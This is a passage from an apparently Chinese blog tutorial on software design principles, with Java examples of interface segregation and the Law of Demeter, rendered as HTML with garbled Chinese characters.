class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> io.xtwoy.principle.segregation.improve;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Segregation1</span> &#123;<br><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>      <span class="hljs-comment">// TODO Auto-generated method stub</span><br>      <span class="hljs-comment">// ä½¿ç”¨ä¸€æŠŠ</span><br>      <span class="hljs-type">A</span> <span class="hljs-variable">a</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">A</span>();<br>      a.depend1(<span class="hljs-keyword">new</span> <span class="hljs-title class_">B</span>()); <span class="hljs-comment">// Aç±»é€šè¿‡æ¥å£å»ä¾èµ–Bç±»</span><br>      a.depend2(<span class="hljs-keyword">new</span> <span class="hljs-title class_">B</span>());<br>      a.depend3(<span class="hljs-keyword">new</span> <span class="hljs-title class_">B</span>());<br><br>      <span class="hljs-type">C</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">C</span>();<br><br>      c.depend1(<span class="hljs-keyword">new</span> <span class="hljs-title class_">D</span>()); <span class="hljs-comment">// Cç±»é€šè¿‡æ¥å£å»ä¾èµ–(ä½¿ç”¨)Dç±»</span><br>      c.depend4(<span class="hljs-keyword">new</span> <span class="hljs-title class_">D</span>());<br>      c.depend5(<span class="hljs-keyword">new</span> <span class="hljs-title class_">D</span>());<br><br>   &#125;<br><br>&#125;<br><br><span class="hljs-comment">// æ¥å£1</span><br><span class="hljs-keyword">interface</span> <span class="hljs-title class_">Interface1</span> &#123;<br>   <span class="hljs-keyword">void</span> <span class="hljs-title function_">operation1</span><span class="hljs-params">()</span>;<br><br>&#125;<br><br><span class="hljs-comment">// æ¥å£2</span><br><span class="hljs-keyword">interface</span> <span class="hljs-title class_">Interface2</span> &#123;<br>   <span class="hljs-keyword">void</span> <span class="hljs-title function_">operation2</span><span class="hljs-params">()</span>;<br><br>   <span class="hljs-keyword">void</span> <span class="hljs-title function_">operation3</span><span class="hljs-params">()</span>;<br>&#125;<br><br><span class="hljs-comment">// æ¥å£3</span><br><span class="hljs-keyword">interface</span> <span class="hljs-title class_">Interface3</span> &#123;<br>   <span class="hljs-keyword">void</span> <span class="hljs-title function_">operation4</span><span class="hljs-params">()</span>;<br><br>   <span class="hljs-keyword">void</span> <span class="hljs-title function_">operation5</span><span class="hljs-params">()</span>;<br>&#125;<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">B</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Interface1</span>, Interface2 &#123;<br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">operation1</span><span class="hljs-params">()</span> &#123;<br>      System.out.println(<span class="hljs-string">&quot;B å®ç°äº† operation1&quot;</span>);<br>   &#125;<br><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">operation2</span><span class="hljs-params">()</span> &#123;<br>      System.out.println(<span class="hljs-string">&quot;B å®ç°äº† operation2&quot;</span>);<br>   &#125;<br><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">operation3</span><span class="hljs-params">()</span> &#123;<br>      System.out.println(<span class="hljs-string">&quot;B å®ç°äº† operation3&quot;</span>);<br>   &#125;<br><br>&#125;<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">D</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Interface1</span>, Interface3 &#123;<br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">operation1</span><span class="hljs-params">()</span> &#123;<br>      System.out.println(<span class="hljs-string">&quot;D å®ç°äº† operation1&quot;</span>);<br>   &#125;<br><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">operation4</span><span class="hljs-params">()</span> &#123;<br>      System.out.println(<span class="hljs-string">&quot;D å®ç°äº† operation4&quot;</span>);<br>   &#125;<br><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">operation5</span><span class="hljs-params">()</span> &#123;<br>      System.out.println(<span class="hljs-string">&quot;D å®ç°äº† operation5&quot;</span>);<br>   &#125;<br>&#125;<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">A</span> &#123; <span class="hljs-comment">// A ç±»é€šè¿‡æ¥å£Interface1,Interface2 ä¾èµ–(ä½¿ç”¨) Bç±»ï¼Œä½†æ˜¯åªä¼šç”¨åˆ°1,2,3æ–¹æ³•</span><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">depend1</span><span class="hljs-params">(Interface1 i)</span> &#123;<br>      i.operation1();<br>   &#125;<br><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">depend2</span><span class="hljs-params">(Interface2 i)</span> &#123;<br>      i.operation2();<br>   &#125;<br><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">depend3</span><span class="hljs-params">(Interface2 i)</span> &#123;<br>      i.operation3();<br>   &#125;<br>&#125;<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">C</span> &#123; <span class="hljs-comment">// C ç±»é€šè¿‡æ¥å£Interface1,Interface3 ä¾èµ–(ä½¿ç”¨) Dç±»ï¼Œä½†æ˜¯åªä¼šç”¨åˆ°1,4,5æ–¹æ³•</span><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">depend1</span><span class="hljs-params">(Interface1 i)</span> &#123;<br>      i.operation1();<br>   &#125;<br><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">depend4</span><span class="hljs-params">(Interface3 i)</span> &#123;<br>      i.operation4();<br>   &#125;<br><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">depend5</span><span class="hljs-params">(Interface3 i)</span> &#123;<br>      i.operation5();<br>   &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="åº”ä¼ ç»Ÿæ–¹æ³•çš„é—®é¢˜å’Œä½¿ç”¨æ¥å£éš”ç¦»åŸåˆ™æ”¹è¿›"><a class="markdownIt-Anchor" href="#åº”ä¼ ç»Ÿæ–¹æ³•çš„é—®é¢˜å’Œä½¿ç”¨æ¥å£éš”ç¦»åŸåˆ™æ”¹è¿›"></a> åº”ä¼ ç»Ÿæ–¹æ³•çš„é—®é¢˜å’Œä½¿ç”¨æ¥å£éš”ç¦»åŸåˆ™æ”¹è¿›</h3><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20230108201003713.png" alt="image-20230108201003713" /></p><ol><li><p>ç±» A é€šè¿‡æ¥å£ Interface1 ä¾èµ–ç±» Bï¼Œç±» C é€šè¿‡æ¥å£ Interface1 ä¾èµ–ç±» Dï¼Œå¦‚æœæ¥å£ Interface1 å¯¹äºç±» A å’Œç±» Cæ¥è¯´ä¸æ˜¯æœ€å°æ¥å£ï¼Œé‚£ä¹ˆç±» B å’Œç±» D å¿…é¡»å»å®ç°ä»–ä»¬ä¸éœ€è¦çš„æ–¹æ³•</p></li><li><p>å°†æ¥å£ <strong>Interface1 æ‹†åˆ†ä¸ºç‹¬ç«‹çš„å‡ ä¸ªæ¥å£</strong>ï¼Œç±» A å’Œç±» C åˆ†åˆ«ä¸ä»–ä»¬éœ€è¦çš„æ¥å£å»ºç«‹ä¾èµ–å…³ç³»ã€‚ä¹Ÿå°±æ˜¯é‡‡ç”¨æ¥å£éš”ç¦»åŸåˆ™</p></li><li><p>æ¥å£ Interface1 ä¸­å‡ºç°çš„æ–¹æ³•ï¼Œæ ¹æ®å®é™…æƒ…å†µæ‹†åˆ†ä¸º<strong>ä¸‰ä¸ª</strong>æ¥å£</p></li><li><p><code>Segregation1.java</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> io.xtwoy.principle.segregation.improve;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Segregation1</span> &#123;<br><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>      <span class="hljs-comment">// TODO Auto-generated method stub</span><br>      <span class="hljs-comment">// ä½¿ç”¨ä¸€æŠŠ</span><br>      <span class="hljs-type">A</span> <span class="hljs-variable">a</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">A</span>();<br>      a.depend1(<span class="hljs-keyword">new</span> <span class="hljs-title class_">B</span>()); <span class="hljs-comment">// Aç±»é€šè¿‡æ¥å£å»ä¾èµ–Bç±»</span><br>      a.depend2(<span class="hljs-keyword">new</span> <span class="hljs-title class_">B</span>());<br>      a.depend3(<span class="hljs-keyword">new</span> <span class="hljs-title class_">B</span>());<br><br>      <span class="hljs-type">C</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">C</span>();<br><br>      c.depend1(<span class="hljs-keyword">new</span> <span class="hljs-title class_">D</span>()); <span class="hljs-comment">// Cç±»é€šè¿‡æ¥å£å»ä¾èµ–(ä½¿ç”¨)Dç±»</span><br>      c.depend4(<span class="hljs-keyword">new</span> <span class="hljs-title class_">D</span>());<br>      c.depend5(<span class="hljs-keyword">new</span> <span class="hljs-title class_">D</span>());<br><br>   &#125;<br><br>&#125;<br><br><span class="hljs-comment">// æ¥å£1</span><br><span class="hljs-keyword">interface</span> <span class="hljs-title class_">Interface1</span> &#123;<br>   <span class="hljs-keyword">void</span> <span class="hljs-title function_">operation1</span><span class="hljs-params">()</span>;<br><br>&#125;<br><br><span class="hljs-comment">// æ¥å£2</span><br><span class="hljs-keyword">interface</span> <span class="hljs-title class_">Interface2</span> &#123;<br>   <span class="hljs-keyword">void</span> <span class="hljs-title function_">operation2</span><span class="hljs-params">()</span>;<br><br>   <span class="hljs-keyword">void</span> <span class="hljs-title function_">operation3</span><span class="hljs-params">()</span>;<br>&#125;<br><br><span class="hljs-comment">// æ¥å£3</span><br><span class="hljs-keyword">interface</span> <span class="hljs-title class_">Interface3</span> &#123;<br>   <span class="hljs-keyword">void</span> <span class="hljs-title function_">operation4</span><span class="hljs-params">()</span>;<br><br>   <span class="hljs-keyword">void</span> <span class="hljs-title function_">operation5</span><span class="hljs-params">()</span>;<br>&#125;<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">B</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Interface1</span>, Interface2 &#123;<br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">operation1</span><span class="hljs-params">()</span> &#123;<br>      System.out.println(<span class="hljs-string">&quot;B å®ç°äº† operation1&quot;</span>);<br>   &#125;<br><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">operation2</span><span class="hljs-params">()</span> &#123;<br>      System.out.println(<span class="hljs-string">&quot;B å®ç°äº† operation2&quot;</span>);<br>   &#125;<br><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">operation3</span><span class="hljs-params">()</span> &#123;<br>      System.out.println(<span class="hljs-string">&quot;B å®ç°äº† operation3&quot;</span>);<br>   &#125;<br><br>&#125;<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">D</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Interface1</span>, Interface3 &#123;<br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">operation1</span><span class="hljs-params">()</span> &#123;<br>      System.out.println(<span class="hljs-string">&quot;D å®ç°äº† operation1&quot;</span>);<br>   &#125;<br><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">operation4</span><span class="hljs-params">()</span> &#123;<br>      System.out.println(<span class="hljs-string">&quot;D å®ç°äº† operation4&quot;</span>);<br>   &#125;<br><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">operation5</span><span class="hljs-params">()</span> &#123;<br>      System.out.println(<span class="hljs-string">&quot;D å®ç°äº† operation5&quot;</span>);<br>   &#125;<br>&#125;<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">A</span> &#123; <span class="hljs-comment">// A ç±»é€šè¿‡æ¥å£Interface1,Interface2 ä¾èµ–(ä½¿ç”¨) Bç±»ï¼Œä½†æ˜¯åªä¼šç”¨åˆ°1,2,3æ–¹æ³•</span><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">depend1</span><span class="hljs-params">(Interface1 i)</span> &#123;<br>      i.operation1();<br>   &#125;<br><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">depend2</span><span class="hljs-params">(Interface2 i)</span> &#123;<br>      i.operation2();<br>   &#125;<br><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">depend3</span><span class="hljs-params">(Interface2 i)</span> &#123;<br>      i.operation3();<br>   &#125;<br>&#125;<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">C</span> &#123; <span class="hljs-comment">// C ç±»é€šè¿‡æ¥å£Interface1,Interface3 ä¾èµ–(ä½¿ç”¨) Dç±»ï¼Œä½†æ˜¯åªä¼šç”¨åˆ°1,4,5æ–¹æ³•</span><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">depend1</span><span class="hljs-params">(Interface1 i)</span> &#123;<br>      i.operation1();<br>   &#125;<br><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">depend4</span><span class="hljs-params">(Interface3 i)</span> &#123;<br>      i.operation4();<br>   &#125;<br><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">depend5</span><span class="hljs-params">(Interface3 i)</span> &#123;<br>      i.operation5();<br>   &#125;<br>&#125;<br></code></pre></td></tr></table></figure></li></ol><h2 id="5-è¿ªç±³ç‰¹æ³•åˆ™åˆç§°æœ€å°‘çŸ¥é“åŸåˆ™demeter-principle"><a class="markdownIt-Anchor" href="#5-è¿ªç±³ç‰¹æ³•åˆ™åˆç§°æœ€å°‘çŸ¥é“åŸåˆ™demeter-principle"></a> <strong>5ã€è¿ªç±³ç‰¹æ³•åˆ™ï¼Œåˆç§°æœ€å°‘çŸ¥é“åŸåˆ™ï¼ˆDemeter Principleï¼‰</strong></h2><p>æœ€å°‘çŸ¥é“åŸåˆ™æ˜¯æŒ‡ï¼šä¸€ä¸ªå®ä½“åº”å½“å°½é‡å°‘åœ°ä¸å…¶ä»–å®ä½“ä¹‹é—´å‘ç”Ÿç›¸äº’ä½œç”¨ï¼Œä½¿å¾—ç³»ç»ŸåŠŸèƒ½æ¨¡å—ç›¸å¯¹ç‹¬ç«‹ã€‚</p><ol><li><p>ä¸€ä¸ªå¯¹è±¡åº”è¯¥å¯¹å…¶ä»–å¯¹è±¡ä¿æŒæœ€å°‘çš„äº†è§£</p></li><li><p>ç±»ä¸ç±»å…³ç³»è¶Šå¯†åˆ‡ï¼Œè€¦åˆåº¦è¶Šå¤§</p></li><li><p>è¿ªç±³ç‰¹æ³•åˆ™(Demeter Principle)åˆå«<strong>æœ€å°‘çŸ¥é“åŸåˆ™</strong>ï¼Œå³ä¸€ä¸ªç±»<strong>å¯¹è‡ªå·±ä¾èµ–çš„ç±»çŸ¥é“çš„è¶Šå°‘è¶Šå¥½</strong>ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œå¯¹äºè¢«ä¾èµ–çš„ç±»ä¸ç®¡å¤šä¹ˆå¤æ‚ï¼Œéƒ½å°½é‡å°†é€»è¾‘å°è£…åœ¨ç±»çš„å†…éƒ¨ã€‚å¯¹å¤–é™¤äº†æä¾›çš„ public æ–¹æ³•ï¼Œä¸å¯¹å¤–æ³„éœ²ä»»ä½•ä¿¡æ¯</p></li><li><p>è¿ªç±³ç‰¹æ³•åˆ™è¿˜æœ‰ä¸ªæ›´ç®€å•çš„å®šä¹‰ï¼šåªä¸ç›´æ¥çš„æœ‹å‹é€šä¿¡</p></li><li><p><strong>ç›´æ¥çš„æœ‹å‹</strong>ï¼šæ¯ä¸ªå¯¹è±¡éƒ½ä¼šä¸å…¶ä»–å¯¹è±¡æœ‰<strong>è€¦åˆå…³ç³»</strong>ï¼Œåªè¦ä¸¤ä¸ªå¯¹è±¡ä¹‹é—´æœ‰è€¦åˆå…³ç³»ï¼Œæˆ‘ä»¬å°±è¯´è¿™ä¸¤ä¸ªå¯¹è±¡ä¹‹é—´æ˜¯æœ‹å‹å…³ç³»ã€‚è€¦åˆçš„æ–¹å¼å¾ˆå¤šï¼Œä¾èµ–ï¼Œå…³è”ï¼Œç»„åˆï¼Œèšåˆç­‰ã€‚å…¶ä¸­ï¼Œæˆ‘ä»¬ç§°å‡ºç°<strong>æˆå‘˜å˜é‡</strong>ï¼Œ<strong>æ–¹æ³•å‚æ•°</strong>ï¼Œ<strong>æ–¹æ³•è¿”</strong>å›å€¼ä¸­çš„ç±»ä¸ºç›´æ¥çš„æœ‹å‹ï¼Œè€Œå‡ºç°åœ¨<strong>å±€éƒ¨å˜é‡ä¸­çš„ç±»ä¸æ˜¯ç›´æ¥çš„æœ‹å‹</strong>ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œé™Œç”Ÿçš„ç±»æœ€å¥½ä¸è¦ä»¥å±€éƒ¨å˜é‡çš„å½¢å¼å‡ºç°åœ¨ç±»çš„å†…éƒ¨ã€‚</p></li></ol><h3 id="åº”ç”¨å®ä¾‹"><a class="markdownIt-Anchor" href="#åº”ç”¨å®ä¾‹"></a> åº”ç”¨å®ä¾‹</h3><ol><li>æœ‰ä¸€ä¸ªå­¦æ ¡ï¼Œä¸‹å±æœ‰å„ä¸ªå­¦é™¢å’Œæ€»éƒ¨ï¼Œç°è¦æ±‚æ‰“å°å‡ºå­¦æ ¡æ€»éƒ¨å‘˜å·¥ ID å’Œå­¦é™¢å‘˜å·¥çš„ id</li></ol><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20230108204621982.png" alt="image-20230108204621982" /></p><p><code>Demeter1.java</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> io.xtwoy.principle.demeter;<br><br><span class="hljs-keyword">import</span> java.util.ArrayList;<br><span class="hljs-keyword">import</span> java.util.List;<br><br><span class="hljs-comment">//å®¢æˆ·ç«¯</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Demeter1</span> &#123;<br><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>      <span class="hljs-comment">//åˆ›å»ºäº†ä¸€ä¸ª SchoolManager å¯¹è±¡</span><br>      <span class="hljs-type">SchoolManager</span> <span class="hljs-variable">schoolManager</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SchoolManager</span>();<br>      <span class="hljs-comment">//è¾“å‡ºå­¦é™¢çš„å‘˜å·¥id å’Œ  å­¦æ ¡æ€»éƒ¨çš„å‘˜å·¥ä¿¡æ¯</span><br>      schoolManager.printAllEmployee(<span class="hljs-keyword">new</span> <span class="hljs-title class_">CollegeManager</span>());<br><br>   &#125;<br><br>&#125;<br><br><br><span class="hljs-comment">//å­¦æ ¡æ€»éƒ¨å‘˜å·¥ç±»</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Employee</span> &#123;<br>   <span class="hljs-keyword">private</span> String id;<br><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setId</span><span class="hljs-params">(String id)</span> &#123;<br>      <span class="hljs-built_in">this</span>.id = id;<br>   &#125;<br><br>   <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getId</span><span class="hljs-params">()</span> &#123;<br>      <span class="hljs-keyword">return</span> id;<br>   &#125;<br>&#125;<br><br><br><span class="hljs-comment">//å­¦é™¢çš„å‘˜å·¥ç±»</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">CollegeEmployee</span> &#123;<br>   <span class="hljs-keyword">private</span> String id;<br><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setId</span><span class="hljs-params">(String id)</span> &#123;<br>      <span class="hljs-built_in">this</span>.id = id;<br>   &#125;<br><br>   <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getId</span><span class="hljs-params">()</span> &#123;<br>      <span class="hljs-keyword">return</span> id;<br>   &#125;<br>&#125;<br><br><br><span class="hljs-comment">//ç®¡ç†å­¦é™¢å‘˜å·¥çš„ç®¡ç†ç±»</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">CollegeManager</span> &#123;<br>   <span class="hljs-comment">//è¿”å›å­¦é™¢çš„æ‰€æœ‰å‘˜å·¥</span><br>   <span class="hljs-keyword">public</span> List&lt;CollegeEmployee&gt; <span class="hljs-title function_">getAllEmployee</span><span class="hljs-params">()</span> &#123;<br>      List&lt;CollegeEmployee&gt; list = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;CollegeEmployee&gt;();<br>      <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">10</span>; i++) &#123; <span class="hljs-comment">//è¿™é‡Œæˆ‘ä»¬å¢åŠ äº†10ä¸ªå‘˜å·¥åˆ° list</span><br>         <span class="hljs-type">CollegeEmployee</span> <span class="hljs-variable">emp</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">CollegeEmployee</span>();<br>         emp.setId(<span class="hljs-string">&quot;å­¦é™¢å‘˜å·¥id= &quot;</span> + i);<br>         list.add(emp);<br>      &#125;<br>      <span class="hljs-keyword">return</span> list;<br>   &#125;<br>&#125;<br><br><span class="hljs-comment">//å­¦æ ¡ç®¡ç†ç±»</span><br><br><span class="hljs-comment">//åˆ†æ SchoolManager ç±»çš„ç›´æ¥æœ‹å‹ç±»æœ‰å“ªäº› Employeeã€CollegeManager</span><br><span class="hljs-comment">//CollegeEmployee ä¸æ˜¯ ç›´æ¥æœ‹å‹ è€Œæ˜¯ä¸€ä¸ªé™Œç”Ÿç±»ï¼Œè¿™æ ·è¿èƒŒäº† è¿ªç±³ç‰¹æ³•åˆ™ </span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">SchoolManager</span> &#123;<br>   <span class="hljs-comment">//è¿”å›å­¦æ ¡æ€»éƒ¨çš„å‘˜å·¥</span><br>   <span class="hljs-keyword">public</span> List&lt;Employee&gt; <span class="hljs-title function_">getAllEmployee</span><span class="hljs-params">()</span> &#123;<br>      List&lt;Employee&gt; list = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;Employee&gt;();<br>      <br>      <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">5</span>; i++) &#123; <span class="hljs-comment">//è¿™é‡Œæˆ‘ä»¬å¢åŠ äº†5ä¸ªå‘˜å·¥åˆ° list</span><br>         <span class="hljs-type">Employee</span> <span class="hljs-variable">emp</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Employee</span>();<br>         emp.setId(<span class="hljs-string">&quot;å­¦æ ¡æ€»éƒ¨å‘˜å·¥id= &quot;</span> + i);<br>         list.add(emp);<br>      &#125;<br>      <span class="hljs-keyword">return</span> list;<br>   &#125;<br><br>   <span class="hljs-comment">//è¯¥æ–¹æ³•å®Œæˆè¾“å‡ºå­¦æ ¡æ€»éƒ¨å’Œå­¦é™¢å‘˜å·¥ä¿¡æ¯(id)</span><br>   <span 